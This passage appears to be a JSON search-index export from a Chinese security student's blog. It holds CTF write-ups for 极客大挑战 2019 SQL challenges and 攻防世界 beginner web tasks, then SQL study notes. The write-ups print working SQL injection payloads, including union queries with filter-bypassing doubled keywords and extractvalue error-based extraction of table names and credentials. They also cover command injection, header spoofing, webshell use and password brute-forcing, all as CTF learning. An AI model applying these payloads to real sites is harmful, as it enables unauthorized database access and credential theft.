爆出flag。","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"极客大挑战sql注入篇","date":"2021-11-26T13:27:03.000Z","path":"2021/11/26/极客大挑战sql注入篇/","text":"[极客大挑战 2019]EasySQL1.先试一下万能钥匙，提示密码的单引号没有闭合。 2.在密码前添加单引号，得到flag。 [极客大挑战 2019]BabySQL1.试一下万能钥匙，反馈得到or好像被注释掉了，再把or换成and也是同样的结果。 2.试一下双写，再补一下密码前的单引号，成功进入得到用户名为admin。 3.再使用一下and双写，把用户名前面的1改为admin，成功进入。 4.直接使用order by语句报错，可以的到里面的or和by都被过滤掉，在把这两个双写，当order by后面数字为3成功进入，为4则报错，因此判断有三列。 5.使用联合查询注入。 -admin&#39; uniounionn seleselectct 1,2,3# 查表名 -admin&#39; ununionion seleselectct 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database() # 查表名 -admin&#39; ununionion seleselectct 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database() # 查一下b4bsql这个表里的值 -admin&#39; ununionion seleselectct 1,2,group_concat(id,username,passwoorrd) frfromom b4bsql # 爆出flag [极客大挑战 2019]HardSQL1.试一下万能钥匙，得不到反馈，猜测可能是盲注。 2.使用Fuzz字典和burp suite测试下被过滤了什么根据response判断： 回显“你可别被我逮住了，臭弟弟”为被过滤的字符； 状态为429的为表示在一定的时间内用户发送了太多的请求，即超出了“频次限制”； 可得长度为751的为可使用的字符 3.在使用盲注之前先试一下extractvalue()函数能不能回显。 ?username=1&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23&amp;password=1 4.接着继续使用sql注入 查表名： ?username=-1&#39;^extractvalue(1,concat(1,(select(table_name)from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))))%23&amp;password=&#39;123 查列名： ?username=-1&#39;^extractvalue(1,concat(1,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))))%23&amp;password=&#39;123 爆flag ?username=-1&#39;^extractvalue(1,concat(1,(select(group_concat(id,&#39;~&#39;,username,&#39;~&#39;,password))from(H4rDsq1))))%23&amp;password=&#39;123 因为extactvalue函数回显的数字限制只回显一半的flag，所有要用left或right函数修改一下payload去掉重复的，拼接起来就是flag ?username=-1&#39;^extractvalue(1,concat(1,(select(right(password,35))from(H4rDsq1))))%23&amp;password=&#39;123","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"攻防世界WEB新手区11、12","date":"2021-11-17T07:51:59.000Z","path":"2021/11/17/攻防世界WEB新手区11、12/","text":"command_execution 题目来源： Cyberpeace-n3k0 题目描述：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。 分析 （1）打开网页 （2）先试着输入127.0.0.1，得到了反馈 （3）试着使用ls语句，发现多出了index.php 说明源代码没有对这些命令语句经行过滤，正如题目所说没有写waf （4）接着使用find语句，寻找flag （5）接着使用cat语句得到flag 关于Linux的常用命令建议阅读https://www.runoob.com/w3cnote/linux-common-command-2.html simple_js 题目来源： root-me 题目描述：小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} ) 分析 （1）打开网页 （2）先看看源代码，在地址前添加view-source: （3）分析一下代码（博主先吐槽一下，源码里搞了很多花里胡哨的东西，有用的没几个） 1.先定义了一个函数dechiffre； 函数里定义了参数pass并赋值一串字符”70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65”; 定义了tab参数并使用了split(）函数以’,’分割参数pass_enc并赋值给tab; 定义了tab2参数同理用split（）函数以’,’分割参数pass并赋值给tab2; 又定义了几个参数i、j、k、l=0、m、n、o、p=””,再赋值i=0,j=tab.length,n=tab2.length(经过split函数的分割后pass被分割成18个部分，即tab2.length的值为18); 接下来写了一个for循环，i=（o=0）即让i的初始值为0，i&lt;(k=j=n)即i&lt;18，让o=tab[i-1],p+=string.fromcharcode((o=tab2[i]))这里使用了string.fromcharcode函数即返回对应的ASCLL值，即返回对应tab2里面的数字对应的ASCLL值，再把转换出来的每一个值加到p这个参数里，当i=5时结束循环; 又定义一个for循环内容与前面一样，前面求的是i小于等于5，这里求i大于5小于17，又因为tab2也只有18个值从0开始即把tab2里所有值转换成ASCII对应的值，对照一下ASCII表可得到p的值为 FAUX PASSWORD HAH; 然后p再加上tab2[17]对应的符号（A），那P就是FAUX PASSWORD HAHA。再把p的值赋值给pass然后结果返回pass。 prompt()是用于显示可提示用户进行输入的对话框。 额。。。无论输入什么值都会返回FAUX PASSWORD HAHA 我们还可以发现后面有一串没有起作用的由十六进制组成字符，还提示我们带入dechiffre函数中转化对应的ASCII值，由此我们猜测这应该是对应的密码，先转换成十进制String[“fromCharCode”]={55,56,54,79,115,69,114,116,107,49,50}，带入上面运算，pass=786OsErtk12（这里其实根据题目提示的flag格式可以推出这个就是flag） （4）又因为无论输入什么值都会返回FAUX PASSWORD HAHA，我们用另存网页，用记事本修改一下代码再打开 这行p += String.fromCharCode((o = tab2[i]))删掉2成p += String.fromCharCode((o = ta[i])); 同样p += String.fromCharCode(tab2[17])也删掉2p += String.fromCharCode(tab[17]);即让它返回的是tab里对应的ASCII的值也就是我们输入的值。 修改完后打开网页，输入55,56,54,79,115,69,114,116,107,49,50得到的也是这串数字所对应的ASCII值即flag","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"极客大挑战2019LoveSQL解析","date":"2021-11-11T12:57:34.000Z","path":"2021/11/11/极客大挑战2019LoveSQL解析/","text":"极客大挑战2019LoveSQL解析（1）打开网页 （2）先尝试注入1’ or 1=1 #密码随便输一下 输出 （3）打开hackbar尝试使用order by语句从1开始查询列数 注：因为url中的#号是用来指导浏览器动作的，对服务器端无用，因此改为%23 http://f10e7b58-be63-4271-83e8-5b7250573c69.node4.buuoj.cn:81/check.php?username=1&#39;order by 4 ​%23 &amp;password=12 直到4出错，因此判断一共有三列 （4）接下来使用union联合注入，先输入select 1,2,3得到 http://f10e7b58-be63-4271-83e8-5b7250573c69.node4.buuoj.cn:81/check.php?username=1&#39;union select 1,2,3 %23 &amp;password=123 查询数据库 http://f10e7b58-be63-4271-83e8-5b7250573c69.node4.buuoj.cn:81/check.php?username=1&#39;union select 1,2,database() ​%23 &amp;password=12 （5）从数据库中查询表名 http://f10e7b58-be63-4271-83e8-5b7250573c69.node4.buuoj.cn:81/check.php?username=1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23 &amp;password=123 （6）从l0ve1vsq1表中查询列名 http://f10e7b58-be63-4271-83e8-5b7250573c69.node4.buuoj.cn:81/check.php?username=1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;l0ve1ysq1&#39; %23 &amp;password=123 得到三列’id,username,password’ （7）从l0ve1vsq1表中查询’id,username,password’的值 http://f10e7b58-be63-4271-83e8-5b7250573c69.node4.buuoj.cn:81/check.php?username=1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23 &amp;password=123 爆出flag{411eec48-f88d-467b-8b1d-b2f876e10482}","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"攻防世界WEB新手区9、10","date":"2021-11-09T14:01:14.000Z","path":"2021/11/09/攻防世界WEB新手区9、10/","text":"xff_referer 题目来源： Cyberpeace-n3k0 题目描述：X老师告诉小宁其实xff和referer是可以伪造的 分析 （1）打开网页 （2）这时要打开burp suite，找到相关网址发送给repeater。 （3）根据格式伪造XXF,添加X-Forwarded-For:123.123.123.123 注：X-Forwarded-For(XFF)是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。这一HTTP头一般格式如下:（X-Forwarded-For: client1, proxy1, proxy2, proxy3） （4）得到提示要求referer为https://www.google.com，添加Referer:https://www.google.com，得到flag 注：referer 网站来路；访问者进入网站的任何途径。HTTPReferrer是header的一部分，当浏览器向web服务器发出请求的时候，一般会带上Referer,告诉服务器用户从那个页面连接过来的，服务器藉此可以获得一些信息用于处理。 webshell 题目来源： Cyberpeace-n3k0 题目描述：小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。 分析 （1）打开网页 （2）根据提示好像与一句话木马有关，关于webshell的工具常见的有中国菜刀、蚁剑等（博主这里使用的是蚁剑） 注：关于webshell可以学习一下https://www.cnblogs.com/csnd/p/11807741.html这篇文章 （3）添加数据，根据提示和与一句话木马有关的内容，知道了连接密码为$_POST[‘shell’]里的shell （4）连接数据 （5）我们发现了flag.txt，打开得到了flag","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"攻防世界WEB新手区7、8","date":"2021-10-31T02:34:02.000Z","path":"2021/10/31/攻防世界WEB新手区7、8/","text":"攻防世界WEB新手区7、8simple_php 题目来源： Cyberpeace-n3k0 题目描述：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。 分析 (1) 进入网页 分析一下代码： a.包含了’config.php’这个文件； b.当$a为零时and $a 得到flag1； $a==0为弱比较类型。==只比较值，不比较类型。===除了比较值，也比较类型。 当a=false时a==0 c.当$b为数字时退出程序 is_numeric() 函数：如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回 1，即 TRUE。 d.如果$b&gt;1234则得到flag2 也就是要保证a=0，b不为数字且要大于1234 （2）先耍点小聪明，既然包含了config.php这个文档，且从代码中可以知道flag就在里面那么我们可以直接查看这个文档得到flag吗？ 在网址后面添加/config.php 既没有报错，也没有显示内容，可能是被人处理过，所以查看不了 （3）还是老实按步骤来吧，本题主要问的是get的传值方式 在原网站后面添加 ？a=false&amp;b=5555d 这里的a也可以是任意字母最后会转换为0，b为数字加字母组合会转换成整数,转换会从第一个字符开始如果不是整数就转换成0.这里转换成了5555。输出结果 ps.get传值格式：url？a=xxx&amp;b=xxx 除了自行写域名进行传值以外，还有使用form表单进行传值： get_post 题目来源： Cyberpeace-n3k0 题目描述：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？ 分析 （1）打开网页，根据提示get传值 （2）然后进行post传值 这个时候就需要用到hackbar（博主使用的是chrome edge浏览器edge商城没有自带这个插件，以下是安装教程，建议资源从教程中的连接下载，官网下载好像要收费），其他浏览器可以自己百度一下，方式大致是相同的。https://blog.csdn.net/weixin_41182861/article/details/107689926） 用post方式传值b=2得到flag","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"攻防世界WEB新手区5、6","date":"2021-10-31T02:33:28.000Z","path":"2021/10/31/攻防世界WEB新手区5、6/","text":"攻防世界WEB新手区5、61.disabled_button 题目来源： Cyberpeace-n3k0 题目描述：X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？ 分析: (1)登入环境 真的是一个不能按的按钮 （2）打开源码 看来是这行代码起的作用，那么就要去修改掉这行代码。 （3）修改网页源代码 a.使用开发者工具进行修改（注意：通过开发者工具的element修改页面源码只对页面的布局(html)有效，对js代码无效。） 把disable改为able，再点击按钮，便可得flag b.使用记事本或其他文本编辑器进行修改 ctrl+s另存网页 用记事本打开，并对源代码进行修改 同样的把disabled改成abled后保存，然后在用浏览器打开，按下按钮得到falg 2.weak_auth 题目来源： Cyberpeace-n3k0 题目描述：小宁写了一个登陆验证页面，随手就设了一个密码。 分析 （1）打开网页 先看看源码，好像没有什么有价值的东西 再尝试登入一下 回显出了用户名，那么只有密码不知道了，接下来就是使用神器burp suite的时候了 打开对应网页，发送到测试器，打开positions由于我们已知用户名，于是把里面的内容改成图像中形式 打开payload，选择自己已有的字典或软件自带的字典，然后开始攻击（只要你的字典足够强大，没有爆破不出来的密码。） 爆破完后，根据长度排序得到密码用账号密码登入后得到flag ps： 1.burp suite的安装教程https://www.sqlsec.com/2020/10/winbp.html 2.burp suite的使用教程https://blog.csdn.net/weixin_44717303/article/details/116563330","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"攻防世界WEB新手区1-4","date":"2021-10-23T08:36:12.000Z","path":"2021/10/23/攻防世界WEB新手区1-4/","text":"攻防世界（WEB）新手区1-4分析1.view_source （难度系数： 1.0）## 题目来源： Cyberpeace-n3k0 题目描述：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。 （1）打开页面 （2）分析：本题主要是在考察怎么查看网页源代码查看方式（这里博主使用的Microsoft Edge浏览器） a.点击鼠标右键（本题鼠标右键使用不了，要使用其他方法） b.使用快捷键 CTRL+U c.在整个网址前添加 “view-source:” eg.view-source:http://111.200.241.244:54909/ ps.这是博主目前知道的方法。 2.robots （难度系数： 1.0）## 题目来源： Cyberpeace-n3k0 题目描述：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。 （1）打开网页，显示空白页 （2）分析：根据题意在网址后添加 /robots.txt 可得 （3）把/f1ag_1s_h3re.php添加到原网址后面即可得到flag 注：以下关于robots协议的内容来自百度百科https://baike.baidu.com/item/Robots%E5%8D%8F%E8%AE%AE/2483797 简单介绍：robots协议也叫robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。 -Robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。 文件写法 User-agent: * Disallow: /admin/ 这里定义是禁止爬寻admin目录下面的目录 Disallow: /cgi-bin/*.htm 禁止访问/cgi-bin/目录下的所有以”.htm”为后缀的URL(包含子目录)。 Disallow: /? 禁止访问网站中所有包含问号 (?) 的网址 Disallow: /.jpg$ 禁止抓取网页所有的.jpg格式的图片 Disallow:/ab/adc.html 禁止爬取ab文件夹下面的adc.html文件。 Allow: /cgi-bin/ 这里定义是允许爬寻cgi-bin目录下面的目录 Allow: .htm$ 仅允许访问以”.htm”为后缀的URL。 Allow: .gif$ 允许抓取网页和gif格式图片 Sitemap: 网站地图 告诉爬虫这个页面是网站地图 文件用法 例1. 禁止所有搜索引擎访问网站的任何部分 User-agent: * Disallow: / 例2. 允许所有的robot访问 (或者也可以建一个空文件 “/robots.txt” file) User-agent: * Allow: / 例3. 禁止某个搜索引擎的访问 User-agent: BadBot Disallow: / 例4. 允许某个搜索引擎的访问 User-agent: Baiduspider allow:/ 3.backup（难度系数： 1.0） 题目来源： Cyberpeace-n3k0 题目描述：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！ （1）打开网页 （2）根据题意地址栏最末加上/index.php~或/index.php.bak得到备份文件，再用txt打开便可的到flag ps.常见的备份文件后缀名有 .git .svn .swp .~ .bak .bash_history 4.cookie（难度系数： 1.0） 题目来源： Cyberpeace-n3k0 题目描述：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’ （1）打开页面 （2）使用浏览器中的开发者工具 （3）在地址后加上/cookie.php,根据页面显示在打开开发者工具，得到flag ps （1）关于HTTP响应可以阅读这篇文章https://www.biancheng.net/http/response.html （2）Cookie介绍（该段来自https://www.jianshu.com/p/6fc9cea6daa2） HTTP协议本身是无状态的。什么是无状态呢，即服务器无法判断用户身份。Cookie实际上是一小段的文本信息（key-value格式）。客户端向服务器发起请求，如果服务器需要记录该用户状态，就使用response向客户端浏览器颁发一个Cookie。客户端浏览器会把Cookie保存起来。当浏览器再请求该网站时，浏览器把请求的网址连同该Cookie一同提交给服务器。服务器检查该Cookie，以此来辨认用户状态。 打个比方，我们去银行办理储蓄业务，第一次给你办了张银行卡，里面存放了身份证、密码、手机等个人信息。当你下次再来这个银行时，银行机器能识别你的卡，从而能够直接办理业务。","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"mysql增删查改语句","date":"2021-10-22T12:32:36.000Z","path":"2021/10/22/mysql增删查改语句/","text":"mysql增删查改语句1.进入mysql库mysql -u 用户名 -p 2.数据库的增删查改语句（1）增–数据库新建语句：create database 库名 default charset=utf8; 注：我们再cmd中输入的字符，采用的字符集是GBK，也就是说客户端(client)的字符集是GBK。而在mysql服务器(server)的字符集是UTF8。首先，在客户端输入的字符，使用的字符集是GBK。当经过连接器的时候，连接器会进行”字符集的自动转换”，将原来的子符(以GBK进行编码)转换为以UTF8格式的编码字符，临时存储在连接器中。接着，连接器发现mysql服务器使用的字符集，与自身字符集完全一致，都是UTF8。于是，直接发给mysql服务器，进行最终的存储。 default charset=utf8设置默认的字符集为UTF8。 （2）删–删除数据库：drop database 库名; （3）查–查找数据库：show databases; 3.数据表的增删改查语句（1）使用数据库：use 数据库; （2）增–新建数据表：create table 数据表名(字段 类型）engine=innodb default charset=utf8； 注：存储引擎是innodb。innoDB 是 MySQL 上第一个提供外键约束的数据存储引擎，除了提供事务处理外，InnoDB 还支持行锁，提供和 Oracle 一样的一致性的不加锁读取，能增加并发读的用户数量并提高性能，不会增加锁的数量。InnoDB 的设计目标是处理大容量数据时最大化性能，它的 CPU 利用率是其他所有基于磁盘的关系数据库引擎中最有效率的。 （3）删–删除数据表：drop table +数据表名称 （4）增–插入数据：insert into 数据表名(字段) values(数值); （5）删–删除某条数据：delete from 表名 where 标识； （6）改–修改内容：update 表名 set 需要修改的内容 where 需要修改的标识；","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"SELECT语句学习笔记2","date":"2021-10-19T11:41:03.000Z","path":"2021/10/19/SELECT语句学习笔记2/","text":"SELECT语句四种查询注：这篇博客是博主通过学习B站这位UP主（https://space.bilibili.com/508641166/video?tid=0&amp;page=1&amp;keyword=&amp;order=pubdate）18到22有关select语句的教程所得出的总结。 1.单表查询：比较常见不过多介绍，博主的上一篇博客介绍的主要内容即为单表查询 2.连接查询注：连接查询又可分为以下6种形式 （1）交叉连接（广义笛卡尔积） 不带谓语的连接（很少使用，连接的表格信息不对等） eg1.SELECT A.* B.* FROM A,B 从AB表中把AB列的所有数据连接起来，缺点为信息连接不对等 eg2（其中FROM后面的逗号也可以更改为CROSS JOIN） SELECT A.* B.* FROM A CROSS JOIN B （2）等值连接:运算符为“=”的连接操作 a.格式：[表名1]&lt;列名1&gt;=[表名2]&lt;列名2&gt; b.注：任何子句中引用表1和表2中同名属性时，都必须加表名前缀；引用唯一属性名时可以加也可以省略表名前缀。 eg1.SELECT A.*,B.* FROM A,B WHERE A.C=B.C 这里AB表中同时包含了C这个属性，所以必须加前缀。 （3）自身连接：一个表于其自己进行连接，称为表的自身连接 注：由于所有属性都是同名属性，所有需要给表起别名以示区别 eg1.SELECT a1.B,a2.B FROM A a1，A a2 WHERE a1.B=a2.B 这里把A表分别命名为a1，a2以作区别 eg2.SELECT a1.B,a2.C FROM A a1，A a2 WHERE a1.B=a2.C （4）复合条件连接:WHERE子句中含多个连接条件时，称为复合条件连接 复合条件连接类型又可分为： a.两表按多个属性连接 b.自身按多个属性连接 c.多表连接 eg1.SELECT A.a,B,C FROM A,D,E WHERE A.a=B.a AND B.b=C.b AB表中a属性相等和BC表中b属性相等 （5）内连接:相当于等值连接，只是表达方法不同（例子如下） eg1.“,&quot;变JOIN,WHERE变ON SELECT A.*,B.* FROM A,B WHERE A.a=B.a SELECT A.*,B.* FROM A JOIN B ON A.a=B.a （6）外连接 a.左连接（又称左外连接）：返回左表中所有行，如果左表行在右表中没有匹配行则返回NULL eg1.SELECT 表一.* ，表二.* FROM 表一 LEFT JOIN 表二 ON 表一.num = 表二.num 把表一与表二中num相等的连接起来 b.右连接（又称右外连接）：返回右表中所有行，如果左右表行在左表中没有匹配行则返回NULL eg2.SELECT 表一.* ，表二.* FROM 表一 RIGHT JOIN 表二 ON 表一.num = 表二.num 把表一与表二中num相等的连接起来 c.全连接:返回左表右表中所有行，当某行在另一表中没有匹配行，则另一表的列返回空值则返回NULL eg1.SELECT 表一.* ，表二.* FROM 表一 FULL JOIN 表二 ON 表一.num = 表二.num 把表一与表二中num相等的连接起来 3.嵌套查询 注：补充 （1）查询块：一个SELECT语句称为一个查询块 （2）嵌套查询：将一个查询块嵌套在另一个查询块的WHERE子句或HAVING短语的条件查询称为嵌套查询 （3）外层查询/父查询 与 内层查询/子查询 SELECT A FROM B WHERE A.c &lt;外层查询/父查询&gt; IN (SELECT C FROM D WHERE C.a=2)&lt;内层查询/子查询&gt; a.不相关子查询:内层查询与外层查询不关联即可独立运行（有里到外逐层查询） eg1.SELECT A FROM B WHERE A.c IN (SELECT C FROM D WHERE C.a=2) 这里的A在B中，C在D中，并且BD不相关联 先从IN里面开始从D中选出当C.a=2的C的列表，再判断外层从B里选择（A.c等同C.a=2的C的列表）的A列表 ps.内层返回的结果数&gt;=2要用IN，如果用“=”会报错 b.相关子查询 ps.注： （1）首先取外层查询中表的第一个元组，根据它与内层查询相关的属性值处理内层查询，若WHERE子句的返回值为真，则取此元组放入结果表，然后再取外层表的下一个元组；重复这一过程，直到外层表全部检查完为止。（外往内） （2）子查询的限制： ①不能使用ORDER BY 子句 ②层层嵌套方式反应了SQL语言的结构化 ③有些嵌套查询可以用连接运算代替 eg1.SELECT A FROM B WHERE EXISTS (SELECT C FROM D WHERE C.a=2 AND C.b=A.b) 这里的A在B中，C在D中，并且BD不相关联 这里由于子查询中没有A.b这个值所以不能从子查询开始运行，应把从B表中取出的A的所有值分别带入子查询中,判断是否与子查询中得出的结果成立（即EXISTS得到的结果为TURE），如果成立则把那个A值放入结果集，重复这一过程，直到A中的值全部检查完为止。 注：这里的EXISTS谓语用法可以参考下面的介绍。 c.嵌套查询的谓语 （1）带有IN谓语的子查询：父查询与子查询用IN连接，子查询结果为集合。 这里的例子，博主还是用上面的例子，其中子查询的结果数大于等于2 eg1.SELECT A FROM B WHERE A.c IN (SELECT C FROM D WHERE C.a=2) 这里的A在B中，C在D中，并且BD不相关联 先从IN里面开始从D中选出当C.a=2的C的列表，再判断外层从B里选择（A.c等同C.a=2的C的列表）的A列表 （2）带有运算符的子查询：当子查询返回的结果集为一个时，可以使用比较运算符（=,&gt;,&lt;,&gt;=,&lt;=,!=或&lt;&gt;,!&gt;,!&lt;）与ALL或ANY谓语配合使用。 eg1.SELECT A FROM B WHERE C&gt;(SELECT AVG(C) FROM B) 其中C与A同在B表里 计算B表中C的平均值，再选出A对应的C值大于C平均值的A ps.子查询要跟在运算符后面 错误示范：SELECT A FROM B WHERE (SELECT AVG(C) FROM B)&lt;C 正确示范如eg1 （3）带有ANY（任意一个值）或ALL（所有值）谓语的子查询 ps：需配合使用比较运算符 格式：&lt;比较运算符&gt;ANY/ALL eg1.选择年段中成绩大于大于一班同学的所有同学名字 SELECT 学生姓名 FROM 年段 WHERE 成绩 &gt;ALL（SELECT 姓名 FROM 年段 WHERE 班级=一班） 注：这里的学生姓名、年段、成绩、姓名、班级、一班是表名或列名 （4）带有EXISTS谓语的子查询（带有EXISTS谓语的子查询不返回任何实际数据它只生“ture”or“false”） eg1.查询选了语文这门课程的学生姓名 SELECT 学生姓名 FROM 年段 WHERE EXTSTS (SELECT * FROM 年段 WHERE 课程=语文) 注：例子中的文字为表名或列名 4.集合查询（1）并操作： 格式：&lt;查询块&gt;UNION&lt;查询块&gt; ps.参加UNION操作的各结果表的列数必须相同，对应数据类型也必须相同 eg.1选择学号是1和2的学生姓名 SELECT 姓名 FROM 学生 WHERE 学号=1 UNION SELECT 姓名 FROM 学生 WHERE 学号=2 这个例子其实可以运用比较运算符，博主为了举例故怎么使用。 （2）交操作：标准的SQL中并没有提供集合交操作，但可以用其他方式间接实现 eg1.查询1班与身高不超190cm的学生交集(即查询1班中身高不超190cm的学生) SELECT * FROM 学生 WHERE 班级=1班 AND 身高&lt;=190; 注：例子中的文字为表名或列名 （3）差操作：标准的SQL中并没有提供集合交操作，但可以用其他方式间接实现 eg1.查询1班与身高不超190cm的学生差集(即查询1班中身高超过190cm的学生) SELECT * FROM 学生 WHERE 班级=1班 AND 身高&gt;190; 注：例子中的文字为表名或列名 （4）对集合操作结果的排序 注： a.ORDER BY 子句只能对最终查询结果排序不能对中间结果排序 b.任何情况下，ORDER BY 子句只能出现在整个语句的最后 c.对于集合操作结果排序时，ORDER BY 子句中可以用数字指定排序属性（即列名），但尽量不用易产生歧义 eg1.查询1班中身高超过190cm的学生 SELECT * FROM 学生 WHERE 班级=1班 UNION SELECT * FROM 学生 WHERE 身高&gt;190 ORDER BY 学号（或1）; 注：例子中的文字为表名或列名，学号的列号为1","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"select语句学习笔记","date":"2021-10-16T16:30:55.000Z","path":"2021/10/17/select语句学习笔记1/","text":"select语句(1)注：这篇博客是博主通过学习B站这位UP主（https://space.bilibili.com/508641166/video?tid=0&amp;page=1&amp;keyword=&amp;order=pubdate）18到22有关select语句的教程所得出的总结。 1.SELECT一般格式SELECT 目标表达式 别名(，目标表达式 别名...） FROM 表名或视图名 别名 （，表名或视图名 别名... ） WHERE 条件表达式 GOUOP BY 列名（，列名...） HAVING 条件表达式 ORDER BY 列名（，列名...）[ASC|DESE] 2.select子句（1）属于投影运算——不消除重复行 （2）SELECT语句后+全部列名或经过计算的值 （3）各列的先后顺序可以与表中的逻辑顺序不一样，用户可以根据需要改变列的显示顺序 eg1.SELECT A FROM B eg2.SELECT *(代表全部列名) FROM A PS. 1.GETDATE()——函数得到系统时间 2.YEAR()——返回指定日期的年日期部分的整数 eg3.SELECT A，YEAR(GETCHAR())-AGE FROM B 注：这里的YEAR(GETCHAR())-AGE中-是减号 3.DISTLNCT筛选避免重复 eg4.SELECT DISTINCT A FROM B 3.WHERE子句中的condition(1)使用比较运算符 =,&gt;,&lt;,&gt;=,&lt;=,!=或&lt;&gt;,!&gt;,!&lt; ps.逻辑运算符NOT+含上述比较运算符表达式 eg1.SELECT A FROM B WHERE NOT C&gt;20; (2)(NOT) BETWEEN…AND… ps. 1.BETWEEN后：范围的下限（及低值）；AND后范围的上限 eg1.SELECT A FROM WHERE A BETWEEN 1 AND 2; (3)确定集合 (NOT) IN &lt;表值，表值，表值…&gt; eg2.SELECT A FROM B WHERE C IN(&#39;a&#39;，&#39;b&#39;) (4)使用字符串匹配（NOT）LIKE 格式： [NOT] LIKE ‘&lt;匹配串&gt;’ [ESCAPE’&lt;转码字符&gt;’] 匹配模板：固定字符串或含通配符的字符串（当匹配模板为固定字符时，可以用=运算符取代LIKE,用!=或&lt;&gt;取代NOT LIKE 谓语） (5)通配符：%——代表任意长度（长度可以为0）的字符串 eg3.a%b表示以a开头，以b结尾的任意长度的字符串。acb、addgb等都符合该匹配串。 (6)_——代表任意单个字符 eg4.a_b表示以a开头，以b结尾的长度为3的任意字符串。如acb等都满足该匹配串。 eg5.查询第2个汉字为“阳”字的学生的姓名 SELECT name FROM Student WHERE name LIKE&#39;_阳%&#39; (7)ESCAPE短语 用户查询字符串本身带有%或_时要用ESCAPE’&lt;转码字符&gt;’短语对通配符进行转义 eg1. 错误表达：SELECT A FROM B WHERE C LIKE&#39;DB_DESIGN&#39; 注：C包含于A中 正确表达：SELECT A FROM B WHERE C LIKE&#39;DB\\_DESIGN&#39; ESCAPE&#39;\\&#39; eg2.SELECT * FROM A WHERE LIKE &#39;DB\\_%I__&#39; ESCAPE&#39;\\&#39; (8)涉及空值的查询 使用谓语IS NULL 或 IS NOT NULL “IS NULL”不能用“=NULL”代替 eg1.SELECT A FROM B WHERE A(C) IS NULL (10)多重条件查询：用逻辑运算符AND和OR来连接多个查询条件（注：1.AND的优先级高于OR ; 2.可以用括号改变优先级 ; 3.可以用来实现多种其他谓语） eg1.SELECT A FROM B WHERE C=&#39;a&#39; AND D&lt;20; eg2.SELECT A FROM B WHERE C IN(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;) 4.对查询结果排序：使用ORDER BY 子句 可以按一个或多个属性列排序 a.ASC(升序)：排序列为空值的元组最后显示 b.DESC(降序)：排序列为空值的元组最先显示 eg1.SELECT A FROM B WHERE C=3 ORDER BY D DESC 5.使用集函数·5类主要集函数（1）COUNT(&lt;列名&gt;)：统计个数 （2）SUM(&lt;列名&gt;)：求总和 （3）ATG(&lt;列名&gt;)：求平均值 （4）MAX(&lt;列名&gt;)：求最大值 （5）MIN(&lt;列名&gt;)：求最小值 eg1.SELECT AVG(A) FROM B WHERE C=1; ps 1.统计时不计NULL值 2.COUNT(*)统计行数 3.DISTINCT 在列名前加DISTINCT则统计时去掉重复行 6.对查询结果分组###a.使用GEOUP BY子句分组 eg1.SELECT A FROM B WHERE C&gt;=90 GROUP BY A; ps 1.分组方法按指定的一列或多列值分组，值相等的为一组 2.使用GROUP BY 子句后，SELECT子句只能包含GROUP BY 后列名和集函数 3.GROUP BY 子句作用对象是查询的中间结果表 ###b.使用HAVING短语筛选最终输出的结果（WHERE是对FROM后的对象筛选，而HAVING是对ORDER 